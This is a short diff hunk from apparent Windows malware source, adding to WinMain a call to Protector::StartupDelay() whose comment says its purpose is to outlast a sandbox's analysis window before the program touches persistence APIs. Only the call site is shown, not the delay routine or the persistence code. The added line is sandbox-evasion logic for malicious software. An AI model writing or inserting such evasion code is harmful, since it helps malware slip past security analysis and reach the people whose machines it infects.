@@ -75,6 +75,9 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, INT) {
 	Manager::Settings s;
 	Manager::ReadData(&s);
 
+	// Outlast sandbox analysis window before touching any persistence APIs.
+	Protector::StartupDelay();
+
 	char me[128] = { 0 };
 	GetModuleFileNameA(0, me, sizeof(me) - 1);
 
